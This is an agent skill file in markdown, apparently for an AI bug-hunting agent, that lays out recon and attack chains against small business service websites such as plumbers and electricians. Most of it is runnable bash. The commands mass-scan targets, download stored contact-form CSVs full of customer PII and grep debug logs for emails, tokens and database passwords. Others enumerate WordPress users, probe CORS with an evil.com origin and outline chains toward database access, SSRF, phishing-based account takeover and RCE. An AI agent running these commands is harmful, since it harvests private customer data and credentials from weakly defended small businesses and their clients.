---
name: recon-smb-services
description: "Sector-specific recon for small business service provider websites — plumbers, HVAC, electricians, landscapers, roofers, painters, cleaners, contractors. Typically WordPress, Wix, Squarespace, or custom PHP on shared hosting with minimal security. These sites often have contact form PII leakage, debug log exposure, directory listing on uploads, outdated plugins, and weak authentication on admin panels. Use when the target scope includes local service businesses, trade contractors, or SMB service provider domains."
sources: field_recon, hackerone_public
report_count: 15
---

# RECON-SMB-SERVICES — Sector-Specific Recon for Small Business Service Provider Sites

## When to Use

Use when the target scope includes small business service provider domains — plumbers, HVAC, electricians, landscapers, roofers, painters, carpet cleaners, pest control, movers, contractors. These are characterized by:
- **Low-budget web presence** — DIY site builders, $10/month shared hosting, no security team
- **Contact-form dependency** — leads come through site forms, stored in plugin upload dirs or emailed
- **Photo galleries of work** — before/after photos with EXIF data (geolocation, device info)
- **Estimation/quote tools** — often custom-coded calculators with injection potential
- **Review/SEO plugins** — Google Reviews, Yelp, BBB badges — third-party JS injection surface
- **Booking/scheduling tools** — embedded Calendly, Acuity, Bookly — SSRF surface via webhook URLs

## Quick Reference

**Pattern catalog:** See `references/wave9-pattern-catalog.md` — 25 attack patterns (P-01 through P-25), 8 CORS bypass variations, 18 WordPress abuse patterns, 12 sector-specific attack matrices with hit rates and top targets, drop-in browser PoC HTML, and highest-yield command sequences.

```bash
# Quick triage
for t in $(cat smb-targets.txt); do
  echo "=== $t ==="
  # CMS fingerprint
  curl -skI "https://$t/" | grep -iE "wordpress|php|wp-|wix|squarespace|shopify"
  # Debug log
  echo -n "Debug: "; curl -sk -o /dev/null -w "%{http_code}" "https://$t/wp-content/debug.log"
  # Directory listing
  echo -n "Uploads: "; curl -sk -o /dev/null -w "%{http_code}" "https://$t/wp-content/uploads/"
  # XMLRPC
  echo -n "XMLRPC: "; curl -sk -o /dev/null -w "%{http_code}" "https://$t/xmlrpc.php"
  # PHPInfo
  echo -n "PHPInfo: "; curl -sk -o /dev/null -w "%{http_code}" "https://$t/info.php"
  # robots.txt hidden paths
  curl -sk "https://$t/robots.txt" | grep "Disallow" | head -5
  echo "---"
done
```

## Step-by-Step

### Phase 1 — Domain Discovery
```bash
# Common patterns:
# <city><service>.com — chicagoplumber.com, austin-electrician.com
# <service><city>.com — plumberchicago.com, hvacdenver.com
# Mr/Mike/Ace/<name>-<service>.com — mrplumber.com, aceelectric.com

# Google dorking
# site:*.com inurl:hvac-contractor OR inurl:plumber-service
# inurl:landscaping site:*.com "free estimate"

# crt.sh for subdomains
curl -sk "https://crt.sh/?q=%25.$TARGET&output=json" | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    domains = sorted(set(d['name_value'] for d in data))
    for d in domains: print(d)
except: pass
" | tee smb-subdomains-$TARGET.txt
```

### Phase 2 — CMS + Contact Form Discovery
```bash
# Find contact form submission storage (PII goldmine)
for path in /wp-content/uploads/wpforms/ /wp-content/uploads/formidable/ \
  /wp-content/uploads/fluentform/ /wp-content/uploads/cf7_uploads/ \
  /wp-content/uploads/gravity_forms/ /wp-content/uploads/contact-form-7/ \
  /wp-content/uploads/bookly/ /uploads/leads/; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET$path")
  size=$(curl -sk "https://$TARGET$path" 2>/dev/null | wc -c)
  if [ "$code" = "200" ] && [ "$size" -gt 100 ]; then
    echo "[+] DIR LISTING: $path"
    curl -sk "https://$TARGET$path" | grep -oP 'href="[^"]+\.(csv|xlsx|txt|pdf|json)"' | head -20
  fi
done

# Check for exposed quote/estimate forms
for path in /quotes/ /estimates/ /proposals/ /invoices/ /projects/ /jobs/; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET$path")
  [ "$code" = "200" ] && echo "[+] PATH: $path (HTTP $code)"
done

# Look for client PDF files (proposals, invoices)
curl -sk "https://$TARGET/" | grep -oP 'href="[^"]+\.(pdf|doc|docx|xlsx)"' | sort -u
```

### Phase 3 — WordPress Recon
```bash
# User enumeration
curl -sk "https://$TARGET/wp-json/wp/v2/users" | jq '.[] | {id, name, slug}'

# CORS credential reflection
curl -skI "https://$TARGET/wp-json/wp/v2/users" -H "Origin: https://evil.com"

# REST API namespaces
curl -sk "https://$TARGET/wp-json/" | python3 -c "
import sys, json
try:
    d = json.load(sys.stdin)
    for ns in d.get('namespaces', []):
        print(f'  {ns}')
except: pass
"

# Debug log PII search
curl -sk "https://$TARGET/wp-content/debug.log" -o /tmp/smb_debug.log 2>/dev/null
if [ -s /tmp/smb_debug.log ] && [ "$(wc -c < /tmp/smb_debug.log)" -gt 100 ]; then
  echo "[!!!] Debug log found ($(wc -c < /tmp/smb_debug.log) bytes)"
  grep -oP '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' /tmp/smb_debug.log | sort -u | head -20
  grep -oP 'eyJ[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{10,}' /tmp/smb_debug.log | head -5
  grep -oP '(DB_PASSWORD|DB_USER|DB_NAME|DB_HOST|API_KEY|SECRET).{0,80}' /tmp/smb_debug.log | head -10
fi
```

### Phase 4 — Plugin & Theme Vulnerabilities
```bash
# Service-business-specific plugins
for plugin in "bookly-responsive-appointment-booking-tool" "wpforms" \
  "formidable" "fluentform" "gravityforms" "contact-form-7" \
  "elementor" "elementskit" "revslider" "wordpress-seo" \
  "google-reviews" "business-reviews-bundle" "wp-reviews-plugin" \
  "woocommerce" "woocommerce-bookings" "tablepress" \
  "estimate-delivery-date-for-woocommerce" "simple-estimator" \
  "strong-testimonials" "site-reviews"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET/wp-content/plugins/$plugin/readme.txt")
  if [ "$code" != "404" ]; then
    version=$(curl -sk "https://$TARGET/wp-content/plugins/$plugin/readme.txt" | grep -i "stable tag\|version" | head -1)
    echo "[+] Plugin: $plugin $version"
  fi
done
```

### Phase 5 — Booking & Scheduling Tool Recon
```bash
# Check for booking/scheduling systems
for path in /book-appointment /schedule /booking /book-online /appointments \
  /calendar /book-now /request-appointment /service-request /quote; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET$path")
  [ "$code" != "404" ] && echo "[+] Booking endpoint: $path (HTTP $code)"
done

# Embedded third-party booking (Calendly, Acuity, Bookly)
curl -sk "https://$TARGET/" | grep -oP 'calendly\.com|acuityscheduling|bookly|setmore|squareup\.com/appointments'

# Webhook URLs in page source (SSRF potential)
curl -sk "https://$TARGET/" | grep -oP 'https?://[^"\x27]+(webhook|hook|callback|zapier|make\.com|integromat)' | sort -u
```

### Phase 6 — Gallery & Photo EXIF Analysis
```bash
# Find photo gallery pages
for path in /gallery /our-work /portfolio /projects /before-after /photos /images; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET$path")
  [ "$code" != "404" ] && echo "[+] Gallery: $path (HTTP $code)"
done

# Download photos and check EXIF (geolocation, device model)
curl -sk "https://$TARGET/" | grep -oP 'src="[^"]+\.(jpg|jpeg|png)"' | sed 's/src="//;s/"//' | \
  while read img; do
    curl -sk "https://$TARGET$img" -o /tmp/exif_check.jpg 2>/dev/null
    exiftool /tmp/exif_check.jpg 2>/dev/null | grep -iE "gps|latitude|longitude|location|camera|model|software|create|date" | head -5
  done
```

### Phase 7 — Attack Chains
```bash
# Chain A: Debug log → DB credentials → DB access
grep -oP "DB_PASSWORD|DB_USER|DB_HOST|DB_NAME" /tmp/smb_debug.log 2>/dev/null

# Chain B: Contact form storage → PII exfil
curl -sk "https://$TARGET/wp-content/uploads/wpforms/" | grep -oP 'href="[^"]+\.(csv|xlsx)"' | \
  while read f; do curl -sk "https://$TARGET/wp-content/uploads/wpforms/$f" -o /tmp/pii/; done

# Chain C: Booking tool webhook → SSRF
# Modify webhook URL in booking plugin settings → point to Collaborator

# Chain D: CORS + user enum → ATO phishing
# curl -sk "https://$TARGET/wp-json/wp/v2/users" -H "Origin: https://evil.com" -H "Cookie: $COOKIE"
```

## Attack Surface Signals

- CMS: WordPress (dominant), Wix, Squarespace, Shopify (for ecommerce services)
- Hosting: Shared hosting, no WAF, Let's Encrypt SSL
- Stack: PHP + MySQL, Contact forms, Photo galleries, Booking/scheduling tools
- Typical findings: Contact form upload leakage, Debug log exposure, Directory listing on uploads, Outdated plugins (Bookly, WPForms, Elementor), CORS credential reflection, XMLRPC open, EXIF geolocation in work photos

## Common Root Causes

1. **DIY website builder** — small business owners build their own sites or pay a local agency minimum fee
2. **No ongoing maintenance** — site built once, never updated, plugins accumulate CVEs over years
3. **Contact form data persistence** — form entries stored on server as CSV/JSON with no retention policy
4. **Photo hosting on same server** — gallery images stored in webroot with full EXIF data
5. **Cheap shared hosting** — no WAF, no CDN, PHP disable_functions wide open
6. **Agency-built, agency-abandoned** — web agency builds the site, client never pays for ongoing maintenance
7. **Embedded third-party tools** — Calendly, Bookly, Acuity Scheduling — SSRF surface through webhook URLs

## Bypass Techniques

- Many SMB sites have dev/staging instances at dev.<domain>, test.<domain>, staging.<domain>
- Check for year-based paths: /uploads/2023/, /uploads/2024/
- Google dork: `site:target.com inurl:wp-content/uploads filetype:pdf "estimate" OR "invoice"`
- Gallery images often have sequential names (IMG_0001.jpg, IMG_0002.jpg)
- Seasonal businesses may have older sites with more vulnerable plugin versions

## Real Examples

From cross-sector mass recon observation:
- A plumber's website had debug.log exposed with 2MB of SQL queries containing customer names, addresses, and phone numbers
- An HVAC company's /wp-content/uploads/ directory listing revealed 500+ service invoices in PDF format with full customer PII
- A landscaping company had Bookly booking plugin with webhook URLs pointing to a Zapier integration, modifiable via CSRF
- An electrician's WordPress had CORS credential reflection + open XMLRPC + outdated Elementor — full RCE chain possible

## Related Skills

- recon-churches — similar sector profile (WordPress on shared hosting, volunteer-maintained)
- recon-daycare — similar PII exposure patterns
- hunt-wordpress — primary CMS for SMB service sites
- hunt-cors — CORS credential reflection on WP REST API
- hunt-source-leak — debug.log, config backups, directory listing
- hunt-file-upload — form upload features, gallery uploads
- hunt-lfi — file inclusion via plugins
- hunt-subdomain — staging/dev instances
- hunt-ssti — booking/quote template injection
